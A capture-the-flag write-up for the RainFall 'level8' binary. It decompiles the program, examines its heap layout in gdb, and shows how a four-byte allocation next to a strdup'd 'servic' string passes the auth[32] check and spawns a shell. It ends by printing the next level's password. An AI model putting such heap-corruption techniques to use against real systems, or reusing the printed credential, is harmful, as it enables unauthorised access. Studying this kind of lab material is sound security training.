# level8

### First analysis

This first analysis is very very confusing, when opening ghidra with the binary of level8, we land on an huge main functions with 10+ variables and 100+ lines of code, very hard to understand and decrypt. After using multiple decompiler, see what makes sense and what doesn't, we obtain this version present in source.c:

```c
char    *auth = NULL;
char    *service = NULL;

int main(void) {
    char    buffer[128];

    while (1) {
        printf("%p, %p \n", auth, service);
        if (!fgets(buffer, 128, stdin))
            break;
        if (!memcmp(buffer, "auth ", 5)) {
            auth = (char *)malloc(4);
            *auth = 0;
            if (strlen(buffer + 5) <= 30)
                strcpy(auth, buffer + 5);
        }

        if (!memcmp(buffer, "reset", 5))
            free(auth);

        if (!memcmp(buffer, "service", 6))
            service = (int)strdup(buffer + 7);

        if (!memcmp(buffer, "login", 5)) {
            if (auth[32] == 0)
                fwrite("Password:\n", 1, 10, stdout);
            else
                system("/bin/sh");
        }
    }
    return 0;
}
```

This is way more clear and easy to comprehend. So as we can see we have some command that are recognized by the binary, 4 to be precise, "auth " (with a space yes), "reset", "service" and "login".

The program also print at the beginning of the loop the address of two globals, auth and service. To define auth, we need to type "auth ", to define service, we need to type "service" or "servic" since only 6 chars are checked. If we want to clear auth, we can use reset, and finally if we want to login (?) we can type login.

By testing a little there are two situations where the program crashes which are:
- When trying to login while nothing is set before (nor auth or service):

```sh
level8@RainFall:~$ ./level8 
(nil), (nil) 
login
Segmentation fault (core dumped)
```

- When trying to free auth two times after it got allocated:

```sh
level8@RainFall:~$ ./level8 
(nil), (nil) 
auth 
0x804a008, (nil) 
reset0x804a008
0x804a008, (nil) 
reset
*** glibc detected *** ./level8: double free or corruption (fasttop): 0x0804a008 ***
======= Backtrace: =========
/lib/i386-linux-gnu/libc.so.6(+0x74f82)[0xb7ea0f82]
[...]
./level8[0x80484d1]
======= Memory map: ========
08048000-08049000 r-xp 00000000 00:10 12541      /home/user/level8/level8
[...]
bffdf000-c0000000 rwxp 00000000 00:00 0          [stack]
Aborted (core dumped)
```

We can also notice some behaviors that deserve to be written:
- When doing allocation the whereas it's auth or service, the address given will always be 0x804a008 first, then an offset of 16 (10 in hex) will be added for the next allocation, and we can re allocate multiple time the same variable:

```sh
level8@RainFall:~$ ./level8 
(nil), (nil) 
service
(nil), 0x804a008 
service
(nil), 0x804a018 
auth 
0x804a028, 0x804a018 
auth
0x804a028, 0x804a018 
auth 
0x804a038, 0x804a018
```0x804a008

### Finding the solution

To focus on the part that could help us, let's start with the condition to enter /bin/sh. For that we need auth[32] to be defined, or said differently, to not be equal 0 (in hexadecimal, not the number 0). This condition doesn't seem too hard to fulfill, however auth is only defined at one certain place:

```c
if (!memcmp(buffer, "auth ", 5)) {
    auth = (char *)malloc(4);
    *auth = 0;
    if (strlen(buffer + 5) <= 30)
        strcpy(auth, buffer + 5);
}
```

Auth is allocated if we type in the stdin opened by fgets() "auth [...]", we simply need to write auth then the name of the person who wants to authenticate themselve in order to enter this condition, that will allocate 4 bytes of memory with malloc, then set auth[0] at null, and finally copying the rest of the command (buffer + 5 means everything after the "auth " that is 5 chars long) in auth, if this value is less than 30 chars long. That causes a problem to the first solution we could think about, if we wanted auth[32] to be defined, we could just have written "auth xxx" with xxx being 33 chars long and it would have been defined. But the limit is 30. However even if we type a string that is less than 30 chars long, we only allocated 4 bytes, so what happens in the heap when we do that ?

### Understanding the heap

You can skip this part if you're only interested in the solution.

Let's analyze what happens in the memory when making an allocation. First let's try to simply make an allocation and store inside it 4 chars, so let's just type "auth lala" and analyze the memory where the malloc points to:

```sh
(gdb) x/12x 0x804a008
0x804a008:	0x616c616c	0x0000000a	0x00000000	0x00020ff1
#              a l a l          \n
0x804a018:	0x00000000	0x00000000	0x00000000	0x00000000
0x804a028:	0x00000000	0x00000000	0x00000000	0x00000000
```

As we saw before in level2, malloc is using a double chained list to store data, and has actually different chunck to store different kind of data, some for very large and heavy data, others for short and light data etc... . Here we use malloc(4), so a very very short size of data, and the chunk selected seems to actually be able to store 16 bytes of data, so 32 bits. Even if the data stored at the end of the 16 bytes doesn't seems to mean anything. However at the beginning we can see out lala (l = 6c, a = 61 in hexadecimal ascii table) and we can also see a 0a on the next 4 bytes, which is the '\n', we didn't think about it but it is still a char, confirming that even if we asked for a malloc of 4, it has a little more space that asked in this assigned chunk. Let's do the exact same to see what happen, so we just type one more type "auth abcd" this type, and see what happen in memory:

```sh
(gdb) x/12x 0x804a008
0x804a008:	0x616c616c	0x0000000a	0x00000000	0x00000011
0x804a018:	0x64636261	0x0000000a	0x00000000	0x00020fe1
#              d c b a          \n
0x804a028:	0x00000000	0x00000000	0x00000000	0x00000000
```

There are a lot of informations to take here. First we can still see the lala we allocated earlier, but the end of the 16 bytes changed, also we can see a new set of data on the second line at address 0x804a018.
This confirm that the space available for every allocation on this chunk is 16 bytes, or actually 12, because the last 4 bytes are used as data by the malloc to know where a node end and where the last node is. We can observe that the last node allocated has this at the end of it: 0x00020fe1, and it was 0x00020ff1 before. This bytes actually show the space left in the chunk for similar allocation, and then decreased by 10 (32 in decimal) between the first auth and the second auth command. what happen if we do the same but we type enough chars to overwrite those data ?

First auth:

```sh
> auth aaaabbbbccccdddd
(gdb) x/12x 0x804a008
0x804a008:	0x61616161	0x62626262	0x63636363	0x64646464
#              a a a a     b b b b     c c c c     d d d d
0x804a018:	0x0000000a	0x00000000	0x00000000	0x00000000
0x804a028:	0x00000000	0x00000000	0x00000000	0x00000000
```

Second auth:

```sh
> auth abcdefgh
(gdb) x/12x 0x804a008
0x804a008:	0x61616161	0x62626262	0x63636363	0x00000011
0x804a018:	0x64636261	0x68676665	0x0000000a	0x64646451
#              d c b a     h g f e          \n
0x804a028:	0x00000000	0x00000000	0x00000000	0x00000000
```

We can see that it took the "dddd" value as the space left in the chunk, decreased it by 10 on the next iteration, and replaced 0x64646464 by 0x00000011 which probably is the way for malloc to identify the end of a node.

What happen now if we even write over the next allocation space ?
0x804a008
First auth:

```sh
> auth aaaabbbbccccddddeeeeffff
(gdb) x/12x 0x804a008
0x804a008:	0x61616161	0x62626262	0x63636363	0x64646464
#              a a a a     b b b b     c c c c     d d d d
0x804a018:	0x65656565	0x66666666	0x0000000a	0x00000000
#              e e e e     f f f f          \n
0x804a028:	0x00000000	0x00000000	0x00000000	0x00000000
```

Second auth:

```sh
(gdb) x/12x 0x804a008
0x804a008:	0x61616161	0x62626262	0x63636363	0x00000011
#              a a a a     b b b b     c c c c     d d d d
0x804a018:	0x64636261	0x68676665	0x0000000a	0x64646451
#              d c b a     h g f e          \n
0x804a028:	0x00000000	0x00000000	0x00000000	0x00000000
```

We can see that malloc treats it as garbage memory and just allocated the next address and overwrite the data.

Now that we know that we just have to find a way to write something 32 bytes after auth address which is 0x804a008 if it is allocated first.

Even if we can't write more than 30 chars on auth location, we have 2 other parts of the code that interacts with the heap:

```c
if (!memcmp(buffer, "reset", 5))
    free(auth);
```

```c
if (!memcmp(buffer, "service", 6))
    service = (int)strdup(buffer + 7);
```

We have the reset command that free auth, but doesn't set auth to null, so we still have access to the address of where auth was allocated. This is why we crash if we call reset 2 times after calling auth a first time, it tries to free the address of auth 2 times, where the second times it's already freed. What we can try is to see if by calling auth, then reset, then auth, if it is the same address allocated for both auth, or not. If it is, it means that free only moves backward the pointer of the last node:

```sh
> auth lalalala
(gdb) x/12x 0x804a008
0x804a008:	0x616c616c	0x616c616c	0x0000000a	0x00020ff1
#              a l a l     a l a l          \n
0x804a018:	0x00000000	0x00000000	0x00000000	0x00000000
0x804a028:	0x00000000	0x00000000	0x00000000	0x00000000
> reset
(gdb) x/12x 0x804a008
0x804a008:	0x00000000	0x616c616c	0x0000000a	0x00020ff1
#                          a l a l          \n
0x804a018:	0x00000000	0x00000000	0x00000000	0x00000000
0x804a028:	0x00000000	0x00000000	0x00000000	0x00000000
> auth lala
(gdb) x/12x 0x804a008
0x804a008:	0x616c616c	0x616c000a	0x0000000a	0x00020ff1
#              a l a l     a l  \n          \n
0x804a018:	0x00000000	0x00000000	0x00000000	0x00000000
0x804a028:	0x00000000	0x00000000	0x00000000	0x00000000
```

free() apparently clean the space allocated (the 4 firsts bytes has been reset to 0), but doesn't take care of the rest of the chunk garbage memory, which leads to some weird behavior when allocating the same address again, it now has the new value, plus the garbage left. Which means that we can leave garbage memory behind, that could be interesting.

What about this weird service command now. Let's first test it as it is supposed to be used:

```sh
> service lala
(gdb) x/12x 0x804a008
0x804a008:	0x6c616c20	0x00000a61	0x00000000	0x00020ff1
#              l a l *        \n a                              * = space character
0x804a018:	0x00000000	0x00000000	0x00000000	0x00000000
0x804a028:	0x00000000	0x00000000	0x00000000	0x00000000
```

As we can see it behaves like auth, however we have one more space present at the beginning, why ? Because service memcmp only checks for 6 chars (memcmp(buffer, "service", 6)) and service is 7 char long, so typing servic would be sufficient, what happen in this case ?

```sh
> servic
(gdb) x/12x 0x804a008
0x804a008:	0x00000000	0x00000000	0x00000000	0x00020ff1
0x804a018:	0x00000000	0x00000000	0x00000000	0x00000000
0x804a028:	0x00000000	0x00000000	0x00000000	0x00000000
> servic lala
(gdb) x/12x 0x804a008
0x804a008:	0x00000000	0x00000000	0x00000000	0x00000011
0x804a018:	0x616c616c	0x0000000a	0x00000000	0x00020fe1
#              a l a l          \n
0x804a028:	0x00000000	0x00000000	0x00000000	0x00000000
```

The memory space is well allocated, but nothing is written inside since there are nothing after buffer + 7. The second one stores lala correctly as it should like auth. However here it is strdup that is used to allocates memory so malloc is handled by strdup, not our program, what happens if we type a buffer longer than 12 bytes that shouldn't be stored in this chunk of malloc then ?

```sh
> servic aaaabbbbccc
(gdb) x/12x 0x804a008
0x804a008:	0x61616161	0x62626262	0x0a636363	0x00000000
#              a a a a     b b b b    \n c c c
0x804a018:	0x00000000	0x00020fe9	0x00000000	0x00000000
0x804a028:	0x00000000	0x00000000	0x00000000	0x00000000
> servic aaaabbbbccccddddeeeeffff
(gdb) x/16x 0x804a008
0x804a008:	0x61616161	0x62626262	0x0a636363	0x00000000
#              a a a a     b b b b    \n c c c
0x804a018:	0x00000000	0x00000021	0x61616161	0x62626262
#                                      a a a a     b b b b
0x804a028:	0x63636363	0x64646464	0x65656565	0x66666666
#              c c c c     d d d d     e e e e     f f f f
0x804a038:	0x0000000a	0x00020fc9	0x00000000	0x00000000
#                   \n
```

Apparently chunks of malloc are more dynamic than we thought it was so far, we can see the space between each allocations more spaced into the memory.

### [The solution](https://www.youtube.com/watch?v=-ZTrBaIUptk)

After understanding how the memory work we can test some things like, using the auth command to set the address at 0x804a008. Then use the servic command and write at least 17 chars, so auth[32] would be set, let's try this:

```sh
> auth lala
> servic aaaabbbbccccdddd
(gdb) x/12x 0x804a008
0x804a008:	0x616c616c	0x0000000a	0x00000000	0x00000019
#              a l a l          \n
0x804a018:	0x61616161	0x62626262	0x63636363	0x64646464
#              a a a a     b b b b     c c c c     d d d d
0x804a028:	0x0000000a	0x00020fd9	0x00000000	0x00000000
#                   \n
```

With this auth[32] == 0x0a so the equivalent of '\n', it is not equal to 0 and should open a /bin/sh if we understood correctly:

```sh
> login
$ whoami
level8
```

It worked, we are now in the shell, we just have to do it without gdb and we will have the flag:

```sh
level8@RainFall:~$ ./level8
(nil), (nil) 
auth lala
0x804a008, (nil) 
servic aaaabbbbccccdddd
0x804a008, 0x804a018 
login
$ whoami
level9
$ cat /home/user/level9/.pass
c542e581c5ba5162a85f767996e3247ed619ef6c6f7b76a59435545dc6259f8a
```

## Important doc

[Multi decompiler](https://dogbolt.org/)
